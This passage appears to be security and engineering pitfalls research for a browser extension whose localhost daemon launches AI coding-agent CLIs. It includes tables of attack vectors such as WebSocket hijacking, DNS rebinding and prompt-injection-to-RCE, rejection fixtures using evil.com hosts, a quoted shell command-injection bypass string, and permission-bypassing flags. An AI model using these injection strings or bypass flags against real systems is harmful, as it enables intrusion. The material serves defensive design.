The existing bridge tests (`tests/mcp-bridge-topology.test.js`) verify multi-hub / multi-relay routing. Delegation adds a new node: the daemon spawns a CLI which connects back to FSB's MCP as its own client. If the hub (the daemon's MCP server) exits mid-run, the CLI's MCP transport drops. Depending on adapter behavior, the CLI either:
- Exits (best case; extension detects agent gone, user sees "agent offline").
- Hangs forever waiting for MCP reconnection (worst case; user cancels, but the extension already lost visibility).
- Reconnects to a fresh hub instance that does not know about this agent's ownership state → cross-agent tab claim collision.

INV-01 forbids changing any existing MCP wire contract. So delegation's new event types MUST be additive; a hub restart that revives with an older protocol version must degrade gracefully, not break the delegation.

**Why it happens:**
The delegation topology is new; existing bridge tests do not cover the "CLI-as-MCP-client-of-FSB-daemon" case.

**How to avoid:**
1. **CLI-as-client heartbeat.** The adapter contract requires each CLI to ping FSB's MCP server every 30 s (v0.9.60's connection_id + reconnect grace pattern applies here). Missed pings → daemon removes the agent's ownership; extension is notified.
2. **Hub restart re-registers agents from persisted state.** On daemon restart, the daemon reads persisted `(agent_id, connection_id, adapter)` and rejects incoming MCP connections that do not match. Prevents ghost-agent revival attacks.
3. **Additive event types only.** Every new bridge event for delegation (`delegation:start`, `delegation:progress`, `delegation:end`, etc.) uses new type strings; all existing types byte-stable. INV-01 gate covers this — extend the existing test that pins EXPECTED_NON_TRIGGER_REGISTRY_HASH to also pin the bridge event-type set.
4. **Topology test coverage.** Add cases for: hub exit during CLI init; hub exit during CLI turn; CLI exits before hub sees the completion; hub sees TWO CLIs claiming the same agent_id (only one wins).

**Warning signs:**
- Any new bridge event that renames or reshapes an existing event.
- Any tool schema change on the CLI-facing MCP surface.
- Topology test suite lacks hub-restart-mid-delegation cases.

**Phase to address:**
Phase 60 (channel design). Bridge topology tests extended in every subsequent phase that touches the wire.

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| `--dangerously-skip-permissions` as default | "Just works" demo | RCE-adjacent (Pitfall 3, 4); every prompt-injection incident becomes RCE | **Never.** Not even in an "advanced mode." |
| URL-query shared secret (`?token=abc`) | Simple to code | Leaks via access logs, DevTools, packet captures | **Never.** Use `Sec-WebSocket-Protocol` header. |
| Skip Origin check "because we only bind localhost" | Removes handshake complexity | CSWSH (Pitfall 1), DNS rebind (Pitfall 2) | **Never.** Both are documented, exploited-in-the-wild attack vectors. |
| `child.kill()` without tree-kill | 1-line implementation | Zombies on Windows, orphaned grandchildren on POSIX (Pitfall 6) | Only in a shrink-wrapped Node script that spawns zero grandchildren. Delegation always violates this. |
| Manual `stdout.on('data')` buffer accumulation | Small code | Backpressure deadlock (Pitfall 7) on long runs | Only if the total output is guaranteed < 4 KB. |
| In-memory `Map<agentId, state>` in SW | Fast reads | State loss on SW eviction (Pitfall 10) | Only for read-only caches that can rehydrate from storage. |
| Warm CLI pool | Reduces cold-start (Pitfall 13) | Memory footprint; RCE persistence horizon (killed daemon still has a warm attacker's CLI in memory) | Post-MVP. Do NOT add in v0.9.91. |
| "Auto-detect" clients from `clientInfo` without allowlist | Zero UX friction | Spoofing (v0.9.36 already used allowlisted labels for exactly this reason) | Only for observability/logging; NEVER for permission decisions. |
| Ship a native messaging host to bypass MV3 SW limits | Solves Pitfall 10 completely | Adds `nativeMessaging` permission (extension review risk); native binary distribution/signing burden per OS | Deferred option in PROJECT.md; do NOT ship in v0.9.91. |

---

## Integration Gotchas

Common mistakes when connecting to external services.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Claude Code CLI | Use `--continue` in `-p` mode expecting session resume | It silently creates a new session; use `--resume <session_id>` |
| Claude Code CLI | Pass user prompt via `--system-prompt` | Prompt injection surface; use `--append-system-prompt` or positional prompt |
| Claude Code CLI | Skip `--strict-mcp-config` | User's global MCP config bleeds into delegation; hermetic runs require it (PROJECT.md commits to this) |
| Codex CLI (`exec`) | Merge stdout and stderr | Progress is on stderr, final message on stdout — separate streams |
| Gemini CLI | Use `--yolo` in non-interactive | Bypasses trust; documented as the CVSS 10 vector |
| Gemini CLI | Trust workspace folder auto | GHSA-wpqr-6v78-jr5g — workspace trust auto-accepts in headless; force explicit `--no-trust-workspace` |
| Any agent CLI | Load user's home-dir agent definition | TrustFall vector; ship FSB's `fsb` agent definition explicitly |
| Any agent CLI | Assume `--version` output format | Not stable; parse defensively, log unknown formats |
| MCP handshake (`initialize`) | Treat `clientInfo.name` as authoritative | Trivially spoofable; use for observability only, gate permissions on the WS transport identity |
| MCP tools registration | Change existing tool schemas | Violates INV-01; all new delegation events must be new types |
| Chrome `chrome.storage.local` | Store the daemon shared secret | Readable by any process reading the profile; use a file with mode 0600 in `~/.fsb/` |
| WebSocket to localhost | Bind `0.0.0.0` | Reachable from LAN + Docker; bind `127.0.0.1` only |
| WebSocket to localhost | Accept any Origin | CSWSH; strict extension-ID allowlist |

---

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| SW keepalive via `chrome.runtime.getPlatformInfo()` every 20 s | Extra CPU, battery drain on laptops | Use WebSocket heartbeat (Chrome 116+ resets SW timer on WS messages) | Any user with the extension always-on |
| Stdout accumulation without drain | Silent CLI stalls after ~64 KB output | `readline` interface + immediate forwarding | Any run longer than a few thousand tokens |
| No detach on `spawn` | Kill leaves grandchildren running; CLI eats memory | `{ detached: true }` + group kill | Any run that spawns MCP sub-servers or shell tools (all of them) |
| Re-scan `platforms.ts` disk paths on every side-panel focus | Slow UI, disk IO | Cache with `chrome.storage.local` + invalidate on install-CLI events | Users with 20+ candidate clients installed |
| No max-turns cap | Runaway agent burns API credit / subscription requests | Enforce `--max-turns` cap in adapter | Any long/hard task; any prompt-injection incident |
| Ring buffer for progress events without eviction | Memory growth over long runs | Bounded queue (e.g., 1000 events) with drop-oldest | Any delegation > 20 min |
| Broadcasting every JSONL line to the side panel | Side-panel React/DOM churn | Batch to 30 fps (~33 ms coalesce window) | Streams > ~30 events/s (chatty models) |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Accept spawn requests from any WebSocket origin | CSWSH → RCE (Mailpit, Dozzle, Nanobot 2025-2026 CVEs) | Extension-ID allowlist on Origin |
| Skip Host header validation on localhost binding | DNS rebinding → RCE (CVE-2025-66414/66416; CVE-2025-49596) | Reject Host != `127.0.0.1`/`localhost` |
| Let the reverse-request payload set CLI flags | Prompt-injection escalates to RCE (CVE-2025-59536, TrustFall) | Daemon owns the flag set; reject unknown payload keys |
| Ship `--dangerously-skip-permissions` / `--yolo` as default | 1-click RCE on any prompt injection | Never expose the flag through delegation |
| Use `sh -c "claude -p '$prompt'"` for spawn | Shell injection (CVE-2025-54795) | `execFile`/`spawn` with argv array; never a shell |
| Log the shared secret in diagnostics | Token leak → spawn RCE | Redact `Sec-WebSocket-Protocol`, `token=`, `?token` patterns |
| Store secret in `chrome.storage.sync` | Syncs across devices — huge leak surface | `chrome.storage.local` or file-based; never sync |
| Trust `clientInfo.name` from MCP handshake | Spoofable — used as evidence for permission decisions → priv-esc | Allowlist for observability; gate permissions on transport ownership |
| Auto-trust project-local agent config | TrustFall class (May 2026, all four major CLIs) | Ship FSB's shipped `fsb` agent definition; `--strict-mcp-config` mandatory |
| Bind daemon to `0.0.0.0` for "just in case" LAN | LAN attackers reach spawn channel | `127.0.0.1` only |
| Skip TLS on the daemon-side stdio connection to the CLI | N/A — stdio is process-local, not TLS-able | Rely on process ownership; do not expose the stdio channel over network |
| Merge delegation progress into the visual-session badge without ownership check | Cross-agent badge spoofing (v0.9.36 anti-pattern) | Reuse v0.9.36 allowlist + ownership token pattern |
| Store executed prompts un-redacted (for audit) alongside secrets | Prompt log becomes a leak vector | Separate stores; redact known secret shapes on write |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Silent 3-8 s cold start (Pitfall 13) | User double-clicks, spawns two runs | Step-labeled progress ("spawning → initializing → sending prompt"); disable button while in flight |
| No "who is running" indicator | User confused about which client did what | Agent-suffix badge (v0.9.60 pattern) with adapter name |
| Chat mode uses `-p` per turn (Pitfall 12) | Agent has no context; user thinks "AI is dumb" | Explicit `session_id` + `--resume` per adapter capability |
| No cost visibility (Pitfall 14) | Bill shock / quota exhaustion | Live token estimate + post-run cost card |
| Agent hijacks the user's active tab (Pitfall 15) | User loses control; work destroyed | Default to background tab; explicit "take control" affordance |
| "Delegate" button reads "Run" | Implies immediacy; user tolerance is 500 ms, not 5 s | "Delegate (starts in a few seconds…)" |
| Doctor state shows spinner on daemon offline | User doesn't know what to do | Explicit "Restart daemon: `npx -y fsb-mcp-server serve`" step |
| Providers panel copy says "no key required — free!" | Users delegate 500 tasks, subscription tanks | "Uses your <Adapter> subscription; check current billing" + link |
| No visible list of what the agent has done | User can't verify or reverse | Action log alongside the side panel (v0.9.24 action-history pattern) |
| Silent CLI hang looks identical to "thinking" | User waits 10 min for a dead CLI | Progress-idle warning at 30 s + kill switch always visible |
| No "recent delegations" audit | User can't review what was executed | Persisted ring buffer of (prompt, adapter, outcome, cost) |

---

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Delegation MVP:** Often missing Origin allowlist on the reverse-request WS — verify a fixture with `Origin: https://evil.com` is rejected before merge (Pitfall 1).
- [ ] **Delegation MVP:** Often missing DNS-rebind Host check — verify a fixture with `Host: evil.com:7225` is rejected even though the target resolves to loopback (Pitfall 2).
- [ ] **Spawn payload contract:** Often accepts flag overrides from the wire — verify the daemon rejects any payload key not in the strict allowlist (Pitfall 3).
- [ ] **"Skip permissions" toggle:** Often ships as a "faster mode" — verify grep of the entire codebase for `dangerously-skip-permissions` finds only test/documentation strings, not spawn code (Pitfall 4).
- [ ] **Shared secret:** Often leaks into diagnostic logs — verify the redaction test suite includes `token=` and `Sec-WebSocket-Protocol` patterns (Pitfall 5).
- [ ] **Kill switch:** Often kills only the parent — verify grandchild processes (spawned by the CLI) are terminated on cancel, on all supported platforms (Pitfall 6). Test on Windows explicitly.
- [ ] **Long runs:** Often deadlock at ~64 KB stdout — verify a fixture that emits 200 KB of JSONL completes without stall (Pitfall 7).
- [ ] **Daemon crash:** Often leaves running CLI processes — verify orphan scan on daemon startup terminates them (Pitfall 8).
- [ ] **Adapter version compat:** Often assumes latest — verify per-adapter compatibility matrix + fail-loud on unknown event types (Pitfall 9).
- [ ] **SW eviction:** Often loses state — verify a fixture that forces SW eviction mid-delegation preserves state on respawn (Pitfall 10).
- [ ] **Tripwire tests:** Often break silently across the milestone — verify CI runs the FULL test suite on every extension-touching PR from the first commit (Pitfall 11).
- [ ] **Chat mode:** Often uses `-p` per turn — verify follow-up prompts genuinely resume the agent's context via `--resume <session_id>` (Pitfall 12).
- [ ] **Cost visibility:** Often absent — verify every completed run shows a cost summary card (Pitfall 14).
- [ ] **Tab conflict:** Often steals focus — verify delegation defaults to a background tab (Pitfall 15).
- [ ] **Bridge topology:** Often lacks hub-restart cases — verify test suite includes hub-exit-mid-delegation cases (Pitfall 16).
- [ ] **INV-01:** Often violated additively "safely" — verify the frozen `EXPECTED_NON_TRIGGER_REGISTRY_HASH` and bridge event-type pin are unchanged after all delegation wiring lands.
- [ ] **Agent identity capture:** Often only records copy-clicks — verify `clientInfo` from MCP `initialize` is threaded through the existing `agent:register` round-trip (currently empty payload per PROJECT.md).
- [ ] **Providers panel rename:** Often just renames text — verify `agent` provider kind hides API-key field and installs the recommended-default rule (connected > installed > copy-clicked).

---

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| CSWSH / DNS-rebind vulnerability discovered post-ship (Pitfall 1, 2) | HIGH | Emergency point release; force-close the bridge; ship Origin/Host checks; force-upgrade extension via Chrome Web Store update priority; publish security advisory |
| Prompt-injection RCE demonstrated in the wild (Pitfall 3) | HIGH | Same as above + audit shipped prompt logs + notify Anthropic/OpenAI/Google if their CLI's contract enabled the escape |
| `--dangerously-skip-permissions` accidentally exposed (Pitfall 4) | HIGH | Same as CSWSH; every affected user must restart the daemon to invalidate any warm-token state |
| Shared secret leak (Pitfall 5) | MEDIUM | Rotate on daemon restart; force one-time re-pair via control-panel prompt |
| Orphaned CLI processes (Pitfall 6) | LOW | Ship next release with tree-kill fix + orphan scanner on startup; run scanner via `fsb-mcp-server doctor` in the meantime |
| Stdout backpressure deadlock (Pitfall 7) | MEDIUM | Point release with `readline` refactor; interim workaround: cap max stream length in the CLI's system prompt |
| Daemon crash orphans (Pitfall 8) | LOW | Same as Pitfall 6 + add heartbeat to next release |
| Adapter drift breaks delegation (Pitfall 9) | LOW-MEDIUM | Compatibility matrix update; ship version-guarded adapter; user runs `fsb-mcp-server doctor` to confirm compat |
| SW eviction loses delegation state (Pitfall 10) | LOW | Point release with `chrome.storage.session` writes on every progress event |
| Source-pin tripwire break (Pitfall 11) | LOW | Fix in-milestone; tripwires are early-detection so cost stays small when honored |
| Chat/task mode confusion (Pitfall 12) | LOW | Documentation + UI copy update; adapter contract adds `session_id` |
| Cost surprise (Pitfall 14) | LOW-MEDIUM | Providers-panel copy update; add cost card; user reimbursement handled per vendor's usual channels (not FSB's problem to fix) |
| User-vs-agent tab conflict (Pitfall 15) | LOW | Default-background-tab + take-control affordance; ship next release |
| Bridge topology regression (Pitfall 16) | MEDIUM | Test coverage gap: add hub-exit-mid-delegation case; ship fix in next release |
| INV-01 wire contract violation | HIGH | Any client that upgraded FSB but not their local CLI could break; roll back the wire change; every new event must remain additive; audit the frozen hash test |

---

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls. Phases 57-63 are the working assumption; final phase numbers land in Phase 57 (requirements definition).

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. Missing Origin validation (CSWSH) | Phase 60 (channel design) | Fixture: `Origin: https://evil.com` handshake rejected |
| 2. DNS rebinding | Phase 60 (channel design) | Fixture: `Host: evil.com:7225` handshake rejected |
| 3. Prompt-injection → spawn RCE | Phase 60 + 61 + 62 (defense-in-depth) | Argv construction lint; adapter payload key allowlist; explicit consent tier test |
| 4. `--dangerously-skip-permissions` defaults | Phase 60 + 62 | Grep-fail CI gate; UX copy audit |
| 5. Shared secret handling | Phase 60 (design) + 62 (rotation UX) | Redaction test suite includes token patterns |
| 6. Zombie / orphaned children | Phase 61 (adapter contract) | Windows + POSIX kill-tree fixtures; orphan scanner |
| 7. Stdout backpressure | Phase 61 (adapter contract) | 200 KB JSONL fixture completes |
| 8. Daemon crash mid-run | Phase 62 (daemon lifecycle) | Kill-daemon test asserts extension outage detection ≤10 s |
| 9. Version drift | Phase 61 (contract) + 63 (drift CI) | Per-adapter version detection; unknown-event fail-loud |
| 10. MV3 SW eviction on long runs | Phase 62 (SW persistence) | `chrome.storage.session` write per progress event; SW-kill fixture |
| 11. Source-pin tripwire breakage | Every extension-touching phase | Full test suite green on every PR |
| 12. Chat vs one-shot mismatch | Phase 61 (adapter caps) + 62 (UX) | Follow-up prompt fixture verifies session continuity |
| 13. Cold-start latency shock | Phase 62 (UX) | Progress step labels; button debounce |
| 14. Cost surprises | Phase 62 (Providers panel copy) + reuse v0.9.69 telemetry | Cost card renders; providers copy references current billing |
| 15. User vs agent tab conflict | Phase 62 (default-background + take-control) | Delegation default opens background tab; take-control affordance test |
| 16. Hub/relay bridge topology edge cases | Phase 60 (design) + every wire-touching phase | Bridge topology test suite includes hub-exit-mid-delegation |

**Phase reads (working assumption; final numbering set in Phase 57):**
- **Phase 57 (requirements definition):** Bakes tripwire and INV-01 gates into the milestone charter. Names Pitfalls 1-5 as security-critical (must-ship-first).
- **Phase 58 (agent identity capture):** Threads `clientInfo` through `agent:register`; disk-detection of installed clients. Low pitfall exposure — allowlist-only.
- **Phase 59 (Providers panel rename):** Rename + `agent` kind + recommended default. Low pitfall exposure — UI-only. Copy must reflect Pitfall 14 (cost).
- **Phase 60 (channel design + secure spawn):** Pitfalls 1, 2, 3, 5, 16 land here. The security foundation.
- **Phase 61 (adapter contract):** Pitfalls 3 (argv), 6, 7, 9, 12 land here. Kill-tree, backpressure, version guards, chat/task modes.
- **Phase 62 (delegation UX + lifecycle):** Pitfalls 4 (UX audit), 8, 10, 13, 14, 15 land here. Consent tiers, daemon lifecycle, cost card, take-control affordance.
- **Phase 63 (CI drift gate + doctor):** Pitfall 9 (drift smoke) + Pitfall 8 (doctor recovery UX).
- **Phase 64+ (Codex/Gemini/OpenCode adapters):** Each new adapter re-uses the Phase 61 contract; per-adapter caps + version matrix + credentials story.

---

## Sources

### 2025-2026 CVEs and Advisories

- [Critical RCE in Anthropic MCP Inspector (CVE-2025-49596)](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596) — CVSS 9.4; MCP proxy accepts stdio commands with no auth or origin gate; DNS rebinding exploitable.
- [MCP Inspector CVE-2025-49596 (NVD detail)](https://nvd.nist.gov/vuln/detail/CVE-2025-49596)
- [MCP Horror Stories: The Drive-By Localhost Breach (Docker)](https://www.docker.com/blog/mpc-horror-stories-cve-2025-49596-local-host-breach/)
- [DNS Rebinding in Official MCP SDKs (CVE-2025-66414 / CVE-2025-66416)](https://vulnerablemcp.info/vuln/cve-2025-66414-66416-dns-rebinding-mcp-sdks.html) — TypeScript SDK (fixed 1.24.0) and Python SDK (fixed 1.23.0).
- [Rafter — DNS Rebinding and Localhost MCP](https://rafter.so/blog/mcp-dns-rebinding-localhost)
- [CVE-2025-59536: Claude Code project files → RCE + API token exfiltration (Check Point Research)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [CVE-2025-54794 / CVE-2025-54795: Claude Code path bypass + command injection (Cymulate)](https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/) — `echo` whitelist bypass via `"\"; <COMMAND>; echo \""`.
- [Google Gemini CLI CVSS 10.0 RCE (Novee Security)](https://novee.security/blog/google-gemini-cli-rce-vulnerability-cvss-10-critical-security-advisory/) — GHSA-wpqr-6v78-jr5g; workspace-trust bypass in headless.
- [Gemini CLI Vulnerability (Tracebit)](https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack)
- [TrustFall: 1-Click RCE Across Claude, Cursor, Gemini CLI, Copilot (Adversa AI)](https://adversa.ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot/) — folder-trust bypass, May 2026.
- [TrustFall follow-up (Lyrie Research)](https://lyrie.ai/research/research/2026-05-09-trustfall-agentic-rce)
- [Mailpit CSWSH Advisory (GHSA-524m-q5m7-79mm)](https://github.com/axllent/mailpit/security/advisories/GHSA-524m-q5m7-79mm)
- [Dozzle CSWSH on `/exec` and `/attach` (CVE-2026-44985, GHSA-j643-x8pv-8m67)](https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67)
- [Nanobot WhatsApp Bridge CSWSH (GHSA-v5j3-4q66-58cf)](https://github.com/HKUDS/nanobot/security/advisories/GHSA-v5j3-4q66-58cf)
- [Cross-Site WebSocket Hijacking Exploitation in 2025 (Include Security)](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/) — current state of browser mitigations; some past attacks still work.
- [MCP Untrusted Servers and Confused Clients (Embrace the Red)](https://embracethered.com/blog/posts/2025/model-context-protocol-security-risks-and-exploits/)
- [Palo Alto Unit 42: Web-based indirect prompt injection observed in the wild](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)

### Vendor Documentation / Official Guidance

- [Claude Code — `--dangerously-skip-permissions` (Truefoundry)](https://www.truefoundry.com/blog/claude-code-dangerously-skip-permissions)
- [Claude Code — Anthropic security best practices (General Analysis)](https://generalanalysis.com/guides/anthropic-claude-code-security-best-practices)
- [Claude Code — Work with sessions](https://code.claude.com/docs/en/agent-sdk/sessions)
- [Claude Code — `--continue` silently creates a new session in non-interactive (`-p`) mode (Kent Gigger)](https://kentgigger.com/posts/claude-code-conversation-history)
- [Claude Code — stream-json format (Background Claude)](https://backgroundclaude.com/blog/stream-json)
- [Claude Code — stream-json output undocumented issue #24594](https://github.com/anthropics/claude-code/issues/24594)
- [Claude Code — event-type documentation feature request #24612](https://github.com/anthropics/claude-code/issues/24612)
- [Claude Code — `--strict-mcp-config` behavior issue #1111](https://github.com/multica-ai/multica/issues/1111)
- [Anthropic — Claude billing split delay (June 15, 2026 pause)](https://www.digitalapplied.com/blog/anthropic-claude-credit-overhaul-june-15-2026)
- [Anthropic pauses Claude Agent SDK subscription change (The New Stack)](https://thenewstack.io/anthropic-pauses-claude-agent-sdk-subscription-change/)
- [Codex CLI — Headless Execution Mode (DeepWiki)](https://deepwiki.com/openai/codex/4.2-model-provider-configuration)
- [Codex CLI — Headless / Non-Interactive Mode (Developer Toolkit)](https://developertoolkit.ai/en/codex/advanced-techniques/non-interactive/)
- [MCP — Handshake, initialize, clientInfo (IMTI)](https://imti.co/mcp-handshake-lifecycle/)
- [MCP — Authorization tutorial](https://modelcontextprotocol.io/docs/tutorials/security/authorization)

### Chrome / MV3 / Runtime

- [Chrome — Extension service worker lifecycle](https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle) — 30 s idle + 5 min single-request limits.
- [Chrome — Longer extension service worker lifetimes](https://developer.chrome.com/blog/longer-esw-lifetimes)
- [Chrome — Use WebSockets in service workers](https://developer.chrome.com/docs/extensions/how-to/web-platform/websockets) — Chrome 116+ WS activity extends SW lifetime.
- [Chrome — Native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)
- [Chrome — Offscreen Documents in MV3](https://developer.chrome.com/blog/Offscreen-Documents-in-Manifest-v3) — WebSocket in offscreen not supported.
- [Chrome — Vibe Engineering: MV3 SW keepalive (Medium)](https://medium.com/@dzianisv/vibe-engineering-mv3-service-worker-keepalive-how-chrome-keeps-killing-our-ai-agent-9fba3bebdc5b)

### Node.js child_process / streams

- [Node.js — Child process (v26)](https://nodejs.org/api/child_process.html) — Windows signal handling caveats.
- [Node.js — Backpressuring in streams](https://nodejs.org/learn/modules/backpressuring-in-streams)
- [Auto-Claude #1252: Windows process cleanup broken — zombies accumulate](https://github.com/AndyMik90/Auto-Claude/issues/1252)
- [Node.js #46569: Unrefed child_process inside a worker thread becomes a zombie](https://github.com/nodejs/node/issues/46569)
- [Node.js help #1389: Correct way to kill a child process](https://github.com/nodejs/help/issues/1389)
- [Killing process families with Node (Almenon)](https://medium.com/@almenon214/killing-processes-with-node-772ffdd19aad)

### Browser Agents / Tab Conflicts

- [Cursor forum: agents use the same browser tab, conflict](https://forum.cursor.com/t/agents-use-the-same-browser-tab-which-creates-a-conflict/151571)
- [OpenClaw #3605: sub-agents share browser profile with parent](https://github.com/openclaw/openclaw/issues/3605)
- [browser-use #1920: multiple agents on same browser, second agent errors](https://github.com/browser-use/browser-use/issues/1920)
- [OpenClaw #25228: MV3 SW lifecycle breaks relay](https://github.com/openclaw/openclaw/issues/25228)

### Repo-internal references (verified via graphify)

- `extension/background.js:8731` — `fsbDispatchInternalMessage()`, same-context dispatch. Auto-memory confirms `sendMessage` does not loop back in-SW; the delegation dispatcher must use this bus.
- `tests/mcp-bridge-topology.test.js` — existing bridge topology tests; extend, do not replace.
- FSB source-pin tripwire policy — auto-memory `fsb-source-pin-tripwires.md`.
- PROJECT.md v0.9.91 Key Context — bridge already rejects untrusted browser origins for MCP; INV-01 wire contracts byte-stable; MV3 SW lifetime constraint acknowledged.

---
*Pitfalls research for: localhost daemon spawning agent CLIs on request from a browser (MV3) surface*
*Researched: 2026-07-10*
